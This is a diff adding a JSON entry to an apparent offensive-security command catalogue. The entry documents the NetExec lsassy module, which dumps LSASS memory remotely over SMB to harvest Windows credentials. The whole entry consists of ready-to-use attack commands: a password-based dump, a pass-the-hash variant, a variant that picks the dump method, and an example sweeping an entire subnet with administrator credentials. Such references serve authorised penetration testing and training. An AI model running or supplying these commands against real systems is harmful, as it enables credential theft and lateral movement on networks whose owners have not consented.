@@ -1,0 +1,20 @@
+{
+  "id": "nxc-lsassy",
+  "name": "NetExec lsassy Module (Remote LSASS Dump)",
+  "command": "nxc smb <target> -u '<user>' -p '<password>' -M lsassy",
+  "description": "Dump LSASS remotely via the lsassy module — uses procdump/comsvcs/dllinjection methods, parses on the fly with pypykatz, and never drops the dump file to disk on the attacker side. Requires local admin on the target.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb"],
+  "tags": ["netexec", "nxc", "lsassy", "lsass", "credentials", "pypykatz"],
+  "variations": [
+    { "label": "Hash Auth", "requires": "hash", "command": "nxc smb <target> -u '<user>' -H '<hash>' -M lsassy" },
+    { "label": "Specific Method", "requires": "password", "command": "nxc smb <target> -u '<user>' -p '<password>' -M lsassy -o METHOD=comsvcs" }
+  ],
+  "references": [
+    { "title": "lsassy", "url": "https://github.com/Hackndo/lsassy" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.0/24 -u administrator -p 'Password123!' -M lsassy"
+  ]
+}
